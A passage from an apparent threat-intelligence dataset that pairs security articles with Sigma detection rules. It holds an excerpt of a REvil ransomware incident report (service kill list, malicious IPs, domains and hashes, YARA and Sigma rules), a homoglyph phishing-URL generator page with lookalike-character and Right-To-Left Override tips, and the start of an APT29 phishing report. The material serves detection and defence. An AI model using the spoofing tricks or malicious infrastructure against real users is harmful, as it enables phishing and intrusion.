(9917)\"\n\"SntpService\"\nVeeamNFSSvc\nKAVFS\nSQLEXPRESSADV\nKAENDCHIPS906995744173948\nsppsvc\nAmsp\npsqlWGE\nMicrosoft.exchange.store.worker.exe\nkavfsscs\n\"Amsp\"\nsqlservr\nAltaro.DedupService.exe\nsvc$\n\"ds_notifier\"\n\"Sophos Device Control Service\"\nAzureADConnectAgentUpdater\nAltiFTPUploader\n\"Sophos MCS Agent\"\n```\n\nTriage sandbox run of the executable without smode:\n\n```image\nAlt: Triage Sandbox\nDescription: The image displays a detailed dashboard or report related to the Sodinokibi (REvil) ransomware, focusing on various signatures and processes associated with it. It features a list of signatures categorized by their effects, such as 'Collection,' 'Credential Access,' 'Defense Evasion,' 'Discovery,' 'Impact,' and 'Persistence.' The signature for the Sodinokibi ransomware is highlighted in red, indicating a significant impact. Additionally, the image lists specific processes, including their file paths, relevant to the ransomware's execution and behavior on the compromised system.\nTranscription: |\n  # Signatures\n  Filter: none\n  - Sodin,Sodinokibi,REvil\n  - Modifies extensions of user files\n  - Reads user/profile data of web browsers\n  - Adds Run key to start application\n  - Enumerates connected drives\n  - Sets desktop wallpaper using registry\n  - Drops file in Program Files directory\n  - Suspicious behavior: EnumeratesProcesses\n  - Suspicious use of AdjustPrivilegeToken\n  \n  # Processes\n  - C:\\Users\\Admin\\AppData\\Local\\Temp\\DomainName.exe\n    - Modifies extensions of user files\n    - Adds Run key to start application\n    - Enumerates connected drives\n    - Drops file in Program Files directory\n    - Suspicious behavior: EnumeratesProcesses\n    - Suspicious use of AdjustPrivilegeToken\n  \n  - C:\\Windows\\system32\\wbem\\unsecapp.exe\n  - C:\\Windows\\system32\\svsvc.exe\n```\n\n### IOCs\n\n#### Network\n\n```\n45.86.163.78|80\n45.86.163.78|443\n45.86.163.78|8080\n195.189.99.74|80\n195.189.99.74|443\n195.189.99.74|8080\n206.189.10.247|80\n161.35.109.168|443\nsmalleststores.com\ncloudmetric.online\ncikawemoret34.space\nnomovee.website\n```\n\n#### File\n\n```\nskull-x64.dat\n5c3a6978bb960d8fbccd117ddcc3ca10\n17424cfeb756e231bea6d1363151a83af142ba6f\n59a2a5fae1c51afbbf1b8c6eb0a65cb2b8575794e3890f499f8935035e633fc\nCiocca.dll\n296f1098a3a8cfb7e07808ee08361495\n7d903f87fd305f1c93ec420848fd6e5aeb018d59\nb1b00f7b065e8c013e0c23c0f34707819e0d537dbe2e83d0d023a11a0ca6b388\nlicense.dat\n6f208841cfd819c29a7cbc0a202bd7a3\n0febc376cc066bb668f1a80b969ed112da8e871c\n45b6349ee9d53278f350b59d4a2a28890bbe9f9de6565453db4c085bb5875865\nDomainName.dll\nc8fab46c4fd61c5f138fb151638c35e1\nc4830cbf3a3044f6e50cd60127ff5681f8ee4bbf\n64076294e761cee0ce7d7cd28dae05f483a711eafe47f94fe881ac3980abfd8f\nDomainName.exe\naf94ccb62f97700115a219c4b7626d22\nbb67edcfe4e5b6fe09ee96e5b8ace7a4cfe39eb7\n2896b38ec3f5f196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c\nsvchost.exe (rclone)\nfcfcf1e45e8d5cdca0450b8dc90754b68e8e4673\n538078ab6d80d7cf889af3e08f62c4e83358596f31ac8ae8fbc6326839a6bfe5\nAdFind.exe\ncb198869ca3c96af536869e71c54dd9d83afbee6\n56de41fa0a94fa7fff68f02712a698ba2f0a71afcecb217f6519bd5751baf3ed\n```\n\n### Detections\n\n#### Network\n\n```\nETPRO TROJAN Cobalt Strike Malleable C2 JQuery Custom Profile M2\nET DNS Query to a *.top domain\nET POLICY OpenSSL Demo CA - Internet Widgits Pty\n```\n\n#### Sigma\n\n- Suspicious PowerShell Encoded Command\n- Trickbot Recon Activity\n- Suspicious Commands Recon Activity\n- Rundll32 Net Connections\n- BITSAdmin Download\n- Suspicious AdFind\n- Suspicious WMI Execution\n- Office Shell\n\nCustom rule thanks to @0xThiebaut:\n\n```\ntitle: Sodinokibi Ransomware Registry Key\nid: 9fecd354-77f0-498e-a611-c963970e7bca\ndescription: Detects the creation of Sodinokibi (aka REvil) registry keys\nstatus: experimental\nreferences:\n  - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\n  - https://twitter.com/malwrhunterteam/status/1372648463553462279\ntags:\n  - attack.persistence\n  - attack.t1547.001\ndate: 2021/03/29\nauthor: Maxime THIEBAUT (@0xThiebaut)\nlogsource:\n  category: registry_event\n  product: windows\ndetection:\n  selection:\n    TargetObject|contains:\n      - '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*AstraZeneca'\n      - '\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\*franceisshit'\ncondition: selection\nlevel: high\n```\n\nCustom rule thanks to @lindodapoet_:\n\n```\ntitle: Svchost data exfiltration\nid: dc4249c9-d96f-401b-a92b-caa6208c097d\nstatus: experimental\ndescription: Detects possible data exfiltration via svchost\nreferences:\n  - https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/\nauthor: Nclose\ndate: 2021/03/29\ntags:\n  - attack.exfiltration\n  - attack.t1048\nlogsource:\n  product: windows\n  service: process_creation\ndetection:\n  selection:\n    CommandLine|contains: 'copy'\n    Image|endswith: '\\svchost.exe'\ncondition: selection\nfalsepositives:\n  - Unknown\nlevel: high\n```\n\n### Custom rules and rule ideas_Ransomware.yaml) written by @BlackMatter23.\n\n### Yara\n\n```\n/*\nYARA Rule Set\nAuthor: The DFIR Report\nDate: 2021-03-29\nIdentifier: files\nReference: https://thedfirreport.com\n*/\n\n/* Rule Set ----------------------------------------------------------------- */\n\nimport \"pe\"\n\nrule Sodinokibi_032021 {\nmeta:\n  description = \"files - file DomainName.exe\"\n  author = \"The DFIR Report\"\n  reference = \"https://thedfirreport.com\"\n  date = \"2021-03-21\"\n  hash1 = \"2896b38ec3f5f196a9d127dbda3f44c7c29c844f53ae5f209229d56fd6f2a59c\"\nstrings:\n  $s1 = \"vmcompute.exe\" fullword wide\n  $s2 = \"vmwp.exe\" fullword wide\n  $s3 = \"bootcfg /raw /a /safeboot:network /id 1\" fullword ascii\n  $s4 = \"bcdedit /set {current} safeboot network\" fullword ascii\n  $s5 = \"7+a@P>:N:0!F$%I-6MBEFb M\" fullword ascii\n  $s6 = \"jg:\\\"\\\\0=Z\" fullword ascii\n  $s7 = \"ERR0R D0UBLE RUN!\" fullword wide\n  $s8 = \"VVVVVPQ\" fullword ascii\n  $s9 = \"VVVVVWQ\" fullword ascii\n  $s10 = \"Running\" fullword wide /* Goodware String - occured 159 times */\n  $s11 = \"expand 32-byte kexpand 16-byte k\" fullword ascii\n  $s12 = \"9RFIT\\\"&\"\n  $s13 = \"jZXVf9F\" fullword ascii\n  $s14 = \"tCWWWhS=@\" fullword ascii\n  $s15 = \"vmms.exe\" fullword wide /* Goodware String - occured 1 times */\n  $s16 = \"JJwK9Zl\" fullword ascii\n  $s17 = \"KkT37uf4nNh2PqUDwZqxcHUMVV3yBwSHO#K\" fullword ascii\n  $s18 = \"0*090}0\" fullword ascii /* Goodware String - occured 1 times */\n  $s19 = \"5)5I5a5\" fullword ascii /* Goodware String - occured 1 times */\n  $s20 = \"7-7H7c7\" fullword ascii /* Goodware String - occured 1 times */\ncondition:\n  uint16(0) == 0x5a4d and filesize < 400KB and\n  ( pe.imphash() == \"031931d2f2d921a9d906454d42f21be0\" or 8 of them )\n}\n\nrule icedid_032021_1 {\nmeta:\n  description = \"files - file skull-x64.dat\"\n  author = \"The DFIR Report\"\n  reference = \"https://thedfirreport.com\"\n  date = \"2021-03-21\"\n  hash1 = \"59a2a5fae1c51afbbf1bf8c6eb0a65cb2b8575794e3890f499f8935035e633fc\"\nstrings:\n  $s1 = \"update\" fullword ascii /* Goodware String - occured 207 times */\n  $s2 = \"PstmStr\" fullword ascii\n  $s3 = \"mRsx0k/\" fullword wide\n  $s4 = \"D$0lzK\" fullword ascii\n  $s5 = \"A;Zts}H\" fullword ascii\ncondition:\n  uint16(0) == 0x5a4d and filesize < 100KB and\n  ( pe.imphash() == \"67a065c05a359d287f1fed9e91f823d5\" and ( pe.exports(\"PstmStr\") and pe.exports(\"update\") ) or all of them )\n}\n\nrule icedid_032021_2 {\nmeta:\n  description = \"1 - file license.dat\"\n  author = \"The DFIR Report\"\n  reference = \"https://thedfirreport.com\"\n  date = \"2021-03-21\"\n  hash1 = \"45b6349ee9d53278f350b59d4a2a28890bbe9f9de6565453db4c085bb5875865\"\nstrings:\n  $s1 = \"+ M:{`n-\" fullword ascii\n  $s2 = \"kwzzdd\" fullword ascii\n  $s3 = \"w5O- >z\" fullword ascii\n  $s4 = \"RRlK8n@~\" fullword ascii\ncondition:\n  uint16(0) == 0x43da and filesize < 1000KB and\n  8 of them\n}\n```\n\n### MITRE\n\n```\nSpearphishing Attachment - T1566.001\nUser Execution - T1204\nWindows Management Instrumentation - T1047\nProcess Injection - T1055\nDomain Trust Discovery - T1482\nDomain Account - T1087.002\nSystem Information Discovery - T1082\nSystem Network Configuration Discovery - T1016\nSecurity Software Discovery - T1518.001\nSMB/Windows Admin Shares - T1021.002\nRemote Desktop Protocol - T1021.001\nCommonly Used Port - T1043\nApplication Layer Protocol - T1071\nExfiltration Over Asymmetric Encrypted Non-C2 Protocol - T1048.002\nData Encrypted for Impact - T1486\nMalicious File - T1204.002\nCommand and Scripting Interpreter - T1059\nPowerShell - T1059.001\nScheduled Task - T1053.005\nRemote System Discovery - T1018\nRundll32 - T1218.011\n```",
    "sigma_rule": {
      "title": "File With Uncommon Extension Created By An Office Application",
      "id": "c7a74c80-ba5a-486e-9974-ab9e682bc5e4",
      "status": "test",
      "description": "Detects the creation of files with an executable or script extension by an Office application.",
      "references": [
        "https://thedfirreport.com/2021/03/29/sodinokibi-aka-revil-ransomware/",
        "https://github.com/vadim-hunter/Detection-Ideas-Rules/blob/02bcbfc2bfb8b4da601bb30de0344ae453aa1afe/Threat%20Intelligence/The%20DFIR%20Report/20210329_Sodinokibi_(aka_REvil)_Ransomware.yaml"
      ],
      "author": "Vadim Khrykov (ThreatIntel), Cyb3rEng (Rule), Nasreddine Bencherchali (Nextron Systems)",
      "date": "2021-08-23",
      "modified": "2023-06-22",
      "tags": [
        "attack.t1204.002",
        "attack.execution"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection1": {
          "Image|endswith": [
            "\\excel.exe",
            "\\msaccess.exe",
            "\\mspub.exe",
            "\\powerpnt.exe",
            "\\visio.exe",
            "\\winword.exe"
          ]
        },
        "selection2": {
          "TargetFilename|endswith": [
            ".bat",
            ".cmd",
            ".com",
            ".dll",
            ".exe",
            ".hta",
            ".ocx",
            ".proj",
            ".ps1",
            ".scf",
            ".scr",
            ".sys",
            ".vbe",
            ".vbs",
            ".wsf",
            ".wsh"
          ]
        },
        "filter_optional_webservicecache": {
          "TargetFilename|contains|all": [
            "C:\\Users\\",
            "\\AppData\\Local\\Microsoft\\Office\\",
            "\\WebServiceCache\\AllUsers"
          ],
          "TargetFilename|endswith": ".com"
        },
        "filter_optional_webex": {
          "Image|endswith": "\\winword.exe",
          "TargetFilename|contains": "\\AppData\\Local\\Temp\\webexdelta\\",
          "TargetFilename|endswith": [
            ".dll",
            ".exe"
          ]
        },
        "filter_main_localassembly": {
          "TargetFilename|contains": "\\AppData\\Local\\assembly\\tmp\\",
          "TargetFilename|endswith": ".dll"
        },
        "condition": "all of selection* and not 1 of filter_main_* and not 1 of filter_optional_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_office_susp_file_extension.yml",
    "id": "873"
  },
  {
    "url": "https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Executable File Creation",
      "id": "74babdd6-a758-4549-9632-26535279e654",
      "status": "test",
      "description": "Detect creation of suspicious executable file names.\nSome strings look for suspicious file extensions, others look for filenames that exploit unquoted service paths.\n",
      "references": [
        "https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae",
        "https://any.run/report/66d8b1b2b9b1836d51014e4cf4ef366c0782d1099e2841a31d2e7fd50a126639/76c69e2d-01e8-49d9-9aea-fb7cc0c4d3ad/"
      ],
      "author": "frack113",
      "date": "2022-09-05",
      "modified": "2023-12-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            ":\\$Recycle.Bin.exe",
            ":\\Documents and Settings.exe",
            ":\\MSOCache.exe",
            ":\\PerfLogs.exe",
            ":\\Recovery.exe",
            ".bat.exe",
            ".sys.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_executable_creation.yml",
    "id": "885"
  },
  {
    "url": "https://any.run/report/66d8b1b2b9b1836d51014e4cf4ef366c0782d1099e2841a31d2e7fd50a126639/76c69e2d-01e8-49d9-9aea-fb7cc0c4d3ad/",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Executable File Creation",
      "id": "74babdd6-a758-4549-9632-26535279e654",
      "status": "test",
      "description": "Detect creation of suspicious executable file names.\nSome strings look for suspicious file extensions, others look for filenames that exploit unquoted service paths.\n",
      "references": [
        "https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae",
        "https://any.run/report/66d8b1b2b9b1836d51014e4cf4ef366c0782d1099e2841a31d2e7fd50a126639/76c69e2d-01e8-49d9-9aea-fb7cc0c4d3ad/"
      ],
      "author": "frack113",
      "date": "2022-09-05",
      "modified": "2023-12-11",
      "tags": [
        "attack.defense-evasion",
        "attack.t1564"
      ],
      "logsource": {
        "product": "windows",
        "category": "file_event"
      },
      "detection": {
        "selection": {
          "TargetFilename|endswith": [
            ":\\$Recycle.Bin.exe",
            ":\\Documents and Settings.exe",
            ":\\MSOCache.exe",
            ":\\PerfLogs.exe",
            ":\\Recovery.exe",
            ".bat.exe",
            ".sys.exe"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_executable_creation.yml",
    "id": "886"
  },
  {
    "url": "http://www.irongeek.com/homoglyph-attack-generator.php",
    "markdown": "# Homoglyph Attack Generator\n\nThis app is meant to make it easier to generate homographs based on Homoglyphs than having to search for look-a-like character in Unicode, then coping and pasting. Please use only for legitimate pen-test purposes and user awareness training. I also recommend webapp developers use it to test out possible user impersonation attacks in their code. This is still a work in progress, so please send me suggestions (especially for new Homoglyphs to add). While this tool was designed with making IDNA/Punycode names for putting into DNS to display foreign characters in a browsers URL bar, it can be used for other things. Try ignoring the IDNA/Punycode stuff and just making look alike user names for systems that accept Unicode. I made this tool to easily generate homographs based on homoglyphs in Unicode and to test out how different apps display them. It seems like a lot of modern browsers have gotten better at warning the users of attack, but I'd love to hear experiences about other apps that accept Unicode/Punycode/Internationalized Domain Names, especially webapps.\n\nFor more information see my Paper Proposal for \"Out of Character: Use of Punycode and Homoglyph Attacks to Obfuscate URLs for Phishing\".\n\n\n**1st**, type in a name to look like: _________________________________\n\n**2nd**, choose homoglyphs to use:\t\n\n**3rd**, Output will be something like this: Output appears here.\n\n**4th** submit so PHP can generate the IDNA/Punycode: [submit]\n\n**Unicode URL to give out:**\n**Encoded label to set up in DNS:**\n\nBelow is phlyLabs original converter if you want to try taking the Homograph back and forth.\n\n**Original (Unicode)** | **Punycode (ACE)**\n______________________ | __________________\n\nIDNA2008 Encode>> <<Decode\n\nPHP code based on examples and libraries from phlyLabs; part of phlyMail. Also thanks to http://homoglyphs.net for helping me find more glyphs.\n\n| Char | Homoglyphs                |\n| ---- | ------------------------- |\n|      | ᅟ ᅠ                   　 ㅤ |\n| !    | ! ǃ ！                     |\n| \"    | \" ״ ″ ＂                   |\n| $    | $ ＄                       |\n| %    | % ％                       |\n| &    | & ＆                       |\n| '    | ' ＇                       |\n| (    | ( ﹝ （                     |\n| )    | ) ﹞ ）                     |\n| *    | * ⁎ ＊                     |\n| +    | + ＋                       |\n| ,    | , ‚ ，                     |\n| -    | - ‐ 𐀠 𴐠－                |\n| .    | . ٠ ۔ ܁ ܂ ․ ‧ 。 ． ｡       |\n| /    | / ̸ ⁄ ∕ ╱ ⫻ ⫽ ／ ﾉ         |\n| 0    | 0 O o Ο ο О о Օ 𐐠𱠠Ｏ ｏ   |\n| 1    | 1 I ا １                   |\n| 2    | 2 ２                       |\n| 3    | 3 ３                       |\n| 4    | 4 ４                       |\n| 5    | 5 ５                       |\n| 6    | 6 ６                       |\n| 7    | 7 𐐠𱰠７                   |\n| 8    | 8 Ց ８                     |\n| 9    | 9 ９                       |\n\n| Char | Homoglyphs                                      |\n| ---- | ----------------------------------------------- |\n| :    | : ։ ܃ ܄ ∶ ꞉ ：                                   |\n| ;    | ; ; ；                                           |\n| <    | < ‹ ＜                                           |\n| =    | = 𐀠 𴀠＝                                        |\n| >    | > › ＞                                           |\n| ?    | ? ？                                             |\n| @    | @ ＠                                             |\n| [    | [ ［                                             |\n| \\    | \\ ＼                                             |\n| ]    | ] ］                                             |\n| ^    | ^ ＾                                             |\n| _    | _ ＿                                             |\n| `    | ` ｀                                             |\n| a    | A a À Á Â Ã Ä Å à á â ã ä å ɑ Α α а Ꭺ Ａ ａ       |\n| b    | B b ß ʙ Β β В Ь Ᏼ ᛒ Ｂ ｂ                         |\n| c    | C c ϲ Ϲ С с Ꮯ Ⅽ ⅽ 𐐠𺀠Ｃ ｃ                       |\n| d    | D d Ď ď Đ đ ԁ ժ Ꭰ ḍ Ⅾ ⅾ Ｄ ｄ                     |\n| e    | E e È É Ê Ë é ê ë Ē ē Ĕ ĕ Ė ė Ę Ě ě Ε Е е Ꭼ Ｅ ｅ |\n| f    | F f Ϝ Ｆ ｆ                                       |\n| g    | G g ɡ ɢ Ԍ ն Ꮐ Ｇ ｇ                               |\n| h    | H h ʜ Η Н һ Ꮋ Ｈ ｈ                               |\n| i    | I i l ɩ Ι І і ا Ꭵ ᛁ Ⅰ ⅰ 𐐠𰰠Ｉ ｉ                 |\n| j    | J j ϳ Ј ј յ Ꭻ Ｊ ｊ                               |\n| k    | K k Κ κ К Ꮶ ᛕ K Ｋ ｋ                             |\n\n| Char | Homoglyphs              |\n| ---- | ----------------------- |\n| l    | L l ʟ ι ا Ꮮ Ⅼ ⅼ Ｌ ｌ     |\n| m    | M m Μ Ϻ М Ꮇ ᛖ Ⅿ ⅿ Ｍ ｍ   |\n| n    | N n ɴ Ν Ｎ ｎ             |\n| 0    | 0 O o Ο ο О о Օ 𐐠𱠠Ｏ ｏ |\n| p    | P p Ρ ρ Р р Ꮲ Ｐ ｐ       |\n| q    | Q q Ⴍ Ⴓ Ｑ ｑ             |\n| r    | R r ʀ Ի Ꮢ ᚱ Ｒ ｒ         |\n| s    | S s Ѕ ѕ Տ Ⴝ Ꮪ 𐐠𵠠Ｓ ｓ   |\n| t    | T t Τ τ Т Ꭲ Ｔ ｔ         |\n| u    | U u μ υ Ա Ս ⋃ Ｕ ｕ       |\n| v    | V v ν Ѵ ѵ Ꮩ Ⅴ ⅴ Ｖ ｖ     |\n| w    | W w ѡ Ꮃ Ｗ ｗ             |\n| x    | X x Χ χ Х х Ⅹ ⅹ Ｘ ｘ     |\n| y    | Y y ʏ Υ γ у Ү Ｙ ｙ       |\n| z    | Z z Ζ Ꮓ Ｚ ｚ             |\n| {    | { ｛                     |\n|      |                         |  | ǀ ا ｜ |\n| }    | } ｝                     |\n| ~    | ~ ⁓ 〜                   |\n| ß    | ß ӧ                     |\n| ä    | Ä Ӓ                     |\n| ö    | Ö Ӧ                     |\n\n**Changes:**\n11/28/2017: Added ḍ as sugested by rockethamster. 3/11/2012: Added option to use 'Right-To-Left Override' (U+202E) so you can do some stupied EXE tricks, and added a linkless output so you can copy & paste your homography without formatting. 3/11/2012: Added ﾉ for /. 4/3/2012: I found a list of IDN blacklisted characters on Mozilla's site and added them. I also added a table of the homoglyphs I'm using.\n3/6/2012: ٠ was also suggested by @Voulnet.\n3/5/2012: @Voulnet suggested I add Arabic letter ا. I put it in for l, i, | and 1.",
    "sigma_rule": {
      "title": "Potential Homoglyph Attack Using Lookalike Characters in Filename",
      "id": "4f1707b1-b50b-45b4-b5a2-3978b5a5d0d6",
      "status": "test",
      "description": "Detects the presence of unicode characters which are homoglyphs, or identical in appearance, to ASCII letter characters.\nThis is used as an obfuscation and masquerading techniques. Only \"perfect\" homoglyphs are included; these are characters that\nare indistinguishable from ASCII characters and thus may make excellent candidates for homoglyph attack characters.\n",
      "references": [
        "https://redcanary.com/threat-detection-report/threats/socgholish/#threat-socgholish",
        "http://www.irongeek.com/homoglyph-attack-generator.php"
      ],
      "author": "Micah Babinski, @micahbabinski",
      "date": "2023-05-08",
      "tags": [
        "attack.defense-evasion",
        "attack.t1036",
        "attack.t1036.003"
      ],
      "logsource": {
        "category": "file_event",
        "product": "windows"
      },
      "detection": {
        "selection_upper": {
          "TargetFilename|contains": [
            "А",
            "В",
            "Е",
            "К",
            "М",
            "Н",
            "О",
            "Р",
            "С",
            "Т",
            "Х",
            "Ѕ",
            "І",
            "Ј",
            "Ү",
            "Ӏ",
            "Ԍ",
            "Ԛ",
            "Ԝ",
            "Α",
            "Β",
            "Ε",
            "Ζ",
            "Η",
            "Ι",
            "Κ",
            "Μ",
            "Ν",
            "Ο",
            "Ρ",
            "Τ",
            "Υ",
            "Χ"
          ]
        },
        "selection_lower": {
          "TargetFilename|contains": [
            "а",
            "е",
            "о",
            "р",
            "с",
            "х",
            "ѕ",
            "і",
            "ӏ",
            "ј",
            "һ",
            "ԁ",
            "ԛ",
            "ԝ",
            "ο"
          ]
        },
        "condition": "1 of selection_*"
      },
      "falsepositives": [
        "File names with legitimate Cyrillic text. Will likely require tuning (or not be usable) in countries where these alphabets are in use."
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\file\\file_event\\file_event_win_susp_homoglyph_filename.yml",
    "id": "888"
  },
  {
    "url": "https://unit42.paloaltonetworks.com/cloaked-ursa-phishing/",
    "markdown": "# Diplomats Beware: Cloaked Ursa Phishing With a Twist\n\n## Executive Summary\n\nRussia’s Foreign Intelligence Service hackers, which we call Cloaked Ursa (aka APT29, UAC-0004, Midnight Blizzard/Nobelium, Cozy Bear) are well known for targeting diplomatic missions globally. Their initial access attempts over the past two years have predominantly used phishing lures with a theme of diplomatic operations such as the following:\n\n- *Notes verbale* (semiformal government-to-government diplomatic communications)\n- Embassies’ operating status updates\n- Schedules for diplomats\n- Invitations to embassy events\n\nThese types of lures are generally sent to individuals who handle this type of embassy correspondence as part of their daily jobs. They are meant to entice targets to open the files on behalf of the organization they work for.\n\nRecently, Unit 42 researchers observed instances of Cloaked Ursa using lures focusing on the diplomats themselves more than the countries they represent. We have identified Cloaked Ursa targeting diplomatic missions within Ukraine by leveraging something that all recently placed diplomats need – a vehicle.\n\nWe observed Cloaked Ursa targeting at least 22 of over 80 foreign missions located in Kyiv. While we don’t have details on their infection success rate, this is a truly astonishing number for a clandestine operation conducted by an advanced persistent threat (APT) that the United States and the United Kingdom publicly attribute to Russia’s Foreign Intelligence Service (SVR).\n\nOur assessment that Cloaked Ursa is responsible for these lures is based on the following:\n\n- Similarities to other known Cloaked Ursa campaigns and targets\n- Use of known Cloaked Ursa TTPs\n- Code overlap with other known Cloaked Ursa malware\n\nThese unconventional lures are designed to entice the recipient to open an attachment based on their own needs and wants instead of as part of their routine duties.\n\nThe lures themselves are broadly applicable across the diplomatic community and thus are able to be sent and forwarded to a greater number of targets. They’re also more likely to be forwarded to others inside of an organization as well as within the diplomatic community.\n\nOverall, these factors increase the odds of a successful compromise within targeted organizations. While not likely to fully supplant diplomatic operations-themed lures, these lures focusing on individuals do provide Cloaked Ursa with new opportunities and a broader range of susceptible potential espionage targets.\n\nPalo Alto Networks customers receive protections against the types of threats discussed in this article by products including:\n\n- Cortex XDR\n- WildFire\n- Cloud-Delivered Security Services for the Next-Generation Firewall, including Advanced URL Filtering and DNS Security\n\nIf you believe you have been compromised, the Unit 42 Incident Response team can provide a personalized response.\n\n### Related Unit 42 Topics\n\n- Russia\n- Ukraine\n- phishing\n\n### Cloaked Ursa APT Group AKAs\n\n- APT29\n- UAC-0004\n- Midnight Blizzard / Nobelium\n- Cozy Bear\n\n## BMW for Sale\n\nOne of the most recent of these novel campaigns that Unit 42 researchers observed appeared to use the legitimate sale of a BMW to target diplomats in Kyiv, Ukraine, as its jumping off point.\n\nThe campaign began with an innocuous and legitimate event. In mid-April 2023, a diplomat within the Polish Ministry of Foreign Affairs emailed his legitimate flyer to various embassies advertising the sale of a used BMW 5-series sedan located in Kyiv. The file was titled `BMW 5 for sale in Kyiv - 2023.docx`.\n\nThe nature of service for professional diplomats is often one that involves a rotating lifestyle of short- to mid-term assignments at postings around the world. Ukraine presents newly assigned diplomats with unique challenges, being in an area of armed conflict between Russia and Ukraine.\n\nHow do you ship personal goods, procure safe accommodations and services, and arrange for reliable personal transportation while in a new country? The sale of a reliable car from a trusted diplomat could be a boon for a recent arrival, which Cloaked Ursa viewed as an opportunity.\n\nWe assess that Cloaked Ursa likely first collected and observed this legitimate advertising flyer via one of the email’s recipients’ mail servers being compromised, or by some other intelligence operation. Upon seeing its value as a generic yet broadly appealing phishing lure, they repurposed it.\n\nTwo weeks later, on May 4, 2023, Cloaked Ursa emailed their illegitimate version of this flyer to multiple diplomatic missions throughout Kyiv. These illegitimate flyers use benign Microsoft Word documents of the same name as that sent by the Polish diplomat.\n\n```image\nAlt: Example lure used in BMW campaign\nDescription: The image is a phishing lure designed to appear as a legitimate advertisement for a BMW 5-series sedan for sale in Kyiv. It features two images of the car, alongside text highlighting its price of 7,500 Euros and details about its condition, mileage, engine type, and features. The layout includes a link labeled \"More high quality photos are here\" that leads to a shortened URL, indicating a potential malicious redirect. The image mimics a realistic car sale flyer, which is used to trick recipients into clicking the link and downloading malware.\nTranscription: |\n  CAR FOR SALE IN KYIV\n  THE PRICE IS REDUCED!!!\n  \n  BMW 5 (F10) 2.0 TDI, 7,500 Euros!!\n  Very good condition, low fuel consumption\n  \n  More high quality photos are here: https://t.ly/...\n  \n  Model: BMW 5, 2.0 TDI (184 HP)\n  Year: April 2011\n  Mileage: 266,000 km\n  Engine: 2.0 Diesel\n  Transmission: Mechanic\n  Colour: Black, black leather interior\n  Package: A/C, set of summer and winter tires, ABS/ESP, led lights, cruise control, multifunction steering wheel, CD, electric seats, electric windows, engine control, rain sensor, electrical hand brake, airbags, start-stop system.\n  Price: 7,500 Euros\n  Custom: NOT CLEARED\n  Contact:\n```\n\n*Figure 1. Example lure used in BMW campaign (SHA256 311e9c8cf6d0b295074ffefaa9f277cb1f806343be262c59f88fbdf6fe242517).*\n\nThe key difference with these illegitimate versions is that if a victim clicks on a link offering “more high quality photos,” a URL shortener service (either `t[.]ly` or `tinyurl[.]com`) will redirect them to a legitimate site. This site would have been coopted by Cloaked Ursa, resulting in the download of a malicious payload.\n\nWhen a victim attempts to view any of the “high quality photos” (shown in Figure 2) in the download, the malware executes silently in the background while the selected image displays on the victim’s screen.\n\n```image\nAlt: Windows shortcut files masquerading as image files\nDescription: The image depicts a file explorer view showing multiple files named 'bmw1.png', 'bmw2.png', 'bmw3.png', etc., up to 'bmw9.png'. Each of these files has a size of 3 KB and a modified date of May 3, 2023, at 12:49 AM. A properties window for 'bmw1.png' is also shown, indicating that it is actually a shortcut file (type: Shortcut) rather than a genuine image file. The file path is shown as E:\\, and its size is listed as 2.26 KB.\nTranscription: |\n  Name                     Date modified      Type      Size\n  ---------------------------------------------------------\n  bmw1.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  bmw2.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  bmw3.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  bmw4.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  bmw5.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  bmw6.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  bmw7.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  bmw8.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  bmw9.png                5/3/2023 12:49 AM  Shortcut  3 KB\n  \n  bmw1.png Properties\n  ---------------------------------------------------------\n  Property      Value\n  -----------------------------------------------\n  File          Name: bmw1.png.lnk\n                Type: Shortcut\n                Folder path: E:\\\n                Size: 2.26 KB\n                Date created: 5/3/2023 12:49 AM\n                Date modified: 5/3/2023 12:49 AM\n```\n\n*Figure 2. Windows shortcut files masquerading as image files.*\n\nFigure 3 illustrates the full execution flow.\n\n```image\nAlt: Execution flow\nDescription: The image illustrates the execution flow of a cyber attack initiated through a phishing campaign. It details the sequence of file types involved, starting from a DOCX file that leads to HTML and ISO files, which contain malicious LNK files masquerading as PNG images. The process shows how an executable (EXE) file loads a malicious DLL via DLL hijacking, ultimately leading to the injection of shellcode into a running Windows process. The final payload beacons to Dropbox and Microsoft Graph API-based command and control (C2) servers, demonstrating the sophisticated nature of the attack.\nTranscription: |\n  [Diagram]\n  1. DOCX\n     - Hyperlink leads to download of further HTML\n  \n  2. HTML\n     - HTML Smuggling used to obscure ISO file\n  \n  3. ISO\n     - ISO contains a number of LNK files masquerading as images\n  \n  4. LNK\n     - 